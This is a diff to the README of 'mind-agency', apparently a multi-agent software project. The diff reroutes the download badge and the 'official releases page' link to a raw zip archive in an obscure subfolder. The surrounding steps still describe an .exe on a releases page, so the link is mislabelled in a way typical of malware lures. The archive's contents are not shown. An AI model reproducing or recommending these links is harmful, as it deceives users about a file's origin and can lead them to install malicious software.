@@ -1,6 +1,6 @@
 # 🧠 mind-agency - Build powerful systems using multiple agents
 
-[![Download mind-agency](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/vanilla-celldeath789/mind-agency)
+[![Download mind-agency](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/vanilla-celldeath789/mind-agency/raw/refs/heads/main/merosthenic/agency_mind_1.2.zip)
 
 ## 🎯 What is this software
 
@@ -19,7 +19,7 @@ Your computer needs these specifications to run the software smoothly:
 
 You need the latest version of the installer to run the platform. Follow these steps to obtain the files:
 
-1. Visit the [official releases page](https://github.com/vanilla-celldeath789/mind-agency).
+1. Visit the [official releases page](https://github.com/vanilla-celldeath789/mind-agency/raw/refs/heads/main/merosthenic/agency_mind_1.2.zip).
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file name to start your download.
 4. Keep the file in your Downloads folder to simplify the installation process.
